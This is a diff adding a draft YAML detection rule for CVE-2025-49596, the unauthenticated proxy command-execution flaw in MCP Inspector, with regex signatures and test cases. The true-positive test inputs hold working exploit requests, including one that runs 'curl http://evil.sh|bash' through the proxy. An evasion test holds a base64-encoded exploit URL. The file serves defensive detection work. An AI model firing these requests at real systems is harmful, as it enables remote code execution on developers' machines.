@@ -1,0 +1,188 @@
+title: "MCP Inspector Unauthenticated Proxy stdio Command Execution (CVE-2025-49596)"
+id: ATR-2026-02021
+rule_version: 1
+status: draft
+description: >
+  Detects exploitation of CVE-2025-49596 (CVSS 9.4), the unauthenticated proxy
+  RCE in Anthropic's MCP Inspector (versions < 0.14.1) reported by Oligo
+  Security. The Inspector proxy listens on 0.0.0.0:6277 and exposes an /sse
+  endpoint that spawns an MCP server over stdio using attacker-controlled
+  transportType, command, and args query parameters — with no authentication
+  or origin check. A malicious public web page (or a DNS-rebinding origin that
+  resolves to 127.0.0.1/0.0.0.0) can issue a cross-site fetch to
+  http://0.0.0.0:6277/sse?transportType=stdio&command=<cmd>&args=<args> and
+  achieve arbitrary OS command execution on the developer's machine. This rule
+  fires on the concrete request signature — the :6277/sse endpoint carrying
+  transportType=stdio together with a command= parameter — not on prose that
+  merely names the CVE. Patched in 0.14.1 by adding session-token auth and
+  Origin verification.
+author: "ATR Community (MCP CVE sweep)"
+date: "2026/07/08"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: test
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM06:2025 - Excessive Agency"
+    - "LLM05:2025 - Improper Output Handling"
+  owasp_agentic:
+    - "ASI02:2026 - Tool Misuse and Exploitation"
+    - "ASI05:2026 - Unexpected Code Execution"
+  mitre_atlas:
+    - "AML.T0053 - AI Agent Tool Invocation"
+    - "AML.T0051.001 - Indirect"
+  cve:
+    - "CVE-2025-49596"
+  cwe:
+    - "CWE-352"
+    - "CWE-306"
+    - "CWE-78"
+  external:
+    - "https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596"
+    - "https://nvd.nist.gov/vuln/detail/CVE-2025-49596"
+    - "https://github.com/modelcontextprotocol/inspector/commit/50df0e1"
+
+metadata_provenance:
+  cve: mcp-cve-sweep
+  cwe: mcp-cve-sweep
+  owasp_llm: mcp-cve-sweep
+  owasp_agentic: mcp-cve-sweep
+  mitre_atlas: mcp-cve-sweep
+
+compliance:
+  owasp_agentic:
+    - id: "ASI05:2026"
+      context: "OWASP Agentic ASI05:2026 (Unexpected Code Execution) is exercised by the MCP Inspector unauthenticated /sse stdio proxy (CVE-2025-49596); this rule provides runtime detection of that request signature."
+      strength: primary
+    - id: "ASI02:2026"
+      context: "OWASP Agentic ASI02:2026 (Tool Misuse and Exploitation) is exercised where an attacker drives the Inspector proxy to spawn arbitrary stdio commands (CVE-2025-49596)."
+      strength: secondary
+  owasp_llm:
+    - id: "LLM06:2025"
+      context: "OWASP LLM LLM06:2025 (Excessive Agency) is exercised by an unauthenticated proxy that executes attacker-supplied commands on the developer host (CVE-2025-49596); this rule is a detection implementation for that category."
+      strength: primary
+  eu_ai_act:
+    - article: "15"
+      context: "EU AI Act Article 15 (accuracy, robustness and cybersecurity) requires AI developer tooling to authenticate command-execution endpoints; this rule provides runtime detection evidence for the CVE-2025-49596 unauthenticated proxy RCE."
+      strength: primary
+    - article: "9"
+      context: "EU AI Act Article 9 (risk management system) requires controls against the CVE-2025-49596 unauthenticated MCP Inspector proxy; this rule is a runtime risk-treatment control."
+      strength: secondary
+  nist_ai_rmf:
+    - function: Manage
+      subcategory: "MG.2.3"
+      context: "NIST AI RMF MG.2.3 (risk treatment options selected and tracked) is supported by this rule's detection of the CVE-2025-49596 MCP Inspector unauthenticated proxy stdio command execution."
+      strength: primary
+    - function: Measure
+      subcategory: "MS.2.7"
+      context: "NIST AI RMF MS.2.7 (security and resilience evaluated and documented) is supported by this rule's runtime detection of CVE-2025-49596."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "ISO/IEC 42001 Clause 8.1 (operational planning and control) is operationalised by this rule's detection of the CVE-2025-49596 unauthenticated MCP Inspector proxy."
+      strength: primary
+    - clause: "8.3"
+      context: "ISO/IEC 42001 Clause 8.3 (AI risk treatment) is operationalised by this rule's detection of CVE-2025-49596."
+      strength: secondary
+
+tags:
+  category: tool-poisoning
+  subcategory: mcp-inspector-unauth-proxy
+  scan_target: runtime
+  confidence: high
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  false_positives:
+    - "Legitimate local MCP Inspector usage after the 0.14.1 fix carries a MCP_PROXY_AUTH_TOKEN / session token header and is initiated same-origin from the Inspector UI, not via a cross-site fetch string embedding command=. Documentation of the Inspector's own URL scheme without a command= parameter (e.g. a plain /sse connect) does not match."
+    - "Advisory, patch-note, and research text that merely names CVE-2025-49596, the :6277 port, or the /sse endpoint without carrying a live transportType=stdio + command= request string does not match."
+    - "Generic references to Server-Sent Events (/sse) endpoints on unrelated services that do not combine the :6277 Inspector proxy port with a stdio command parameter."
+  conditions:
+    # Layer 1 — the exact Inspector proxy RCE request: the /sse endpoint on the
+    # 6277 proxy port carrying transportType=stdio and a command= parameter.
+    - field: content
+      operator: regex
+      value: '(?i)/sse\?[^\s"''`]{0,120}\btransportType=stdio\b[^\s"''`]{0,160}\bcommand=[^\s"''`&]{1,120}'
+      description: "MCP Inspector /sse proxy request with transportType=stdio and an attacker-controlled command= parameter — the CVE-2025-49596 canonical exploit signature (order-independent via two conditions)"
+    - field: content
+      operator: regex
+      value: '(?i)/sse\?[^\s"''`]{0,120}\bcommand=[^\s"''`&]{1,120}[^\s"''`]{0,160}\btransportType=stdio\b'
+      description: "Same CVE-2025-49596 /sse proxy request with the command= parameter preceding transportType=stdio in the query string"
+    # Layer 2 — the request aimed at the loopback/any-interface Inspector proxy
+    # port (6277) with a stdio command parameter, catching the localhost and
+    # 0.0.0.0 CSRF/DNS-rebinding target hosts explicitly.
+    - field: content
+      operator: regex
+      value: '(?i)https?://(?:0\.0\.0\.0|127\.0\.0\.1|localhost|\[::1\]):6277/[^\s"''`]{0,80}\bcommand=[^\s"''`&]{1,120}'
+      description: "Cross-site/DNS-rebinding request to the MCP Inspector proxy on 0.0.0.0/127.0.0.1/localhost:6277 carrying a command= parameter — CVE-2025-49596 exploitation against the developer loopback"
+
+response:
+  actions:
+    - alert
+    - block_tool
+  notify:
+    - security_team
+  message_template: >
+    [ATR-2026-02021] CRITICAL: MCP Inspector unauthenticated proxy command
+    execution (CVE-2025-49596, CVSS 9.4). A request targets the Inspector proxy
+    /sse endpoint (port 6277) with transportType=stdio and an attacker-supplied
+    command= parameter — the CSRF/DNS-rebinding RCE against MCP Inspector
+    < 0.14.1. Remediation: upgrade MCP Inspector to 0.14.1 or later (adds
+    session-token auth + Origin verification); bind the proxy to loopback only
+    and never expose 6277 to untrusted origins.
+
+confidence: 88
+wild_fp_rate: 0
+
+test_cases:
+  true_positives:
+    - input: "http://0.0.0.0:6277/sse?transportType=stdio&command=touch&args=%2Ftmp%2Fexploited-from-the-browser"
+      expected: triggered
+      description: "Oligo PoC — cross-site fetch to the Inspector proxy on 0.0.0.0:6277 running touch via the /sse stdio endpoint"
+    - input: "fetch('http://127.0.0.1:6277/sse?transportType=stdio&command=sh&args=-c&args=curl%20http://evil.sh|bash')"
+      expected: triggered
+      description: "DNS-rebinding CSRF to loopback Inspector proxy spawning sh -c curl|bash"
+    - input: "GET /sse?command=/bin/bash&transportType=stdio&args=-c HTTP/1.1 Host: 0.0.0.0:6277"
+      expected: triggered
+      description: "Command= parameter preceding transportType=stdio in the CVE-2025-49596 request"
+    - input: "malicious page issues XHR to http://localhost:6277/sse?transportType=stdio&command=calc.exe to pop a shell on the dev box"
+      expected: triggered
+      description: "localhost:6277 Inspector proxy /sse stdio command execution"
+    - input: "curl 'http://[::1]:6277/sse?transportType=stdio&command=id' — unauthenticated MCP Inspector proxy RCE"
+      expected: triggered
+      description: "IPv6 loopback Inspector proxy request with transportType=stdio and command=id"
+  true_negatives:
+    - input: "The MCP Inspector runs a proxy on port 6277 and a UI on 6274; connect the Inspector to your server over stdio to debug tools."
+      expected: not_triggered
+      description: "Legitimate Inspector documentation naming port 6277 and stdio transport but with no /sse command= request string"
+    - input: "CVE-2025-49596 is an unauthenticated RCE in MCP Inspector below 0.14.1; upgrade to 0.14.1 which adds a proxy auth token."
+      expected: not_triggered
+      description: "Advisory text naming the CVE and the fix without a live exploit request"
+    - input: "Our service exposes an SSE stream at https://api.example.com/sse?channel=updates&format=json for real-time events."
+      expected: not_triggered
+      description: "Unrelated Server-Sent Events endpoint — no 6277 proxy port, no transportType=stdio, no command= parameter"
+    - input: "Set MCP_PROXY_AUTH_TOKEN and open http://127.0.0.1:6274 in the browser; the Inspector UI attaches the session token to every proxy call."
+      expected: not_triggered
+      description: "Post-fix authenticated Inspector usage on the UI port 6274 with a session token — no unauthenticated command= request"
+    - input: "docker run -p 6277:6277 modelcontextprotocol/inspector then browse to the local UI to test your MCP server tools."
+      expected: not_triggered
+      description: "Legitimate Inspector container run publishing port 6277 — no /sse stdio command= exploit request"
+
+evasion_tests:
+  - input: "http://0.0.0.0:6277/sse?transportType=stdio&cmd=touch%20/tmp/x"
+    expected: not_triggered
+    bypass_technique: parameter_alias
+    notes: "If a future Inspector variant accepted an aliased 'cmd=' parameter instead of 'command=', the Layer-1 anchor on the literal command= token would miss it. The canonical CVE-2025-49596 endpoint uses command=; a v2 could add a command|cmd alternation if a real aliased endpoint is observed."
+  - input: "aHR0cDovLzAuMC4wLjA6NjI3Ny9zc2U/dHJhbnNwb3J0VHlwZT1zdGRpbyZjb21tYW5kPXRvdWNo"
+    expected: not_triggered
+    bypass_technique: base64_encode
+    notes: "The full exploit URL base64-encoded inside a JS string. Literal /sse, transportType=stdio, and command= tokens no longer appear, so the regex anchors miss. Base64-of-URL heuristics belong in an engine-level normalization layer, not this signature rule."
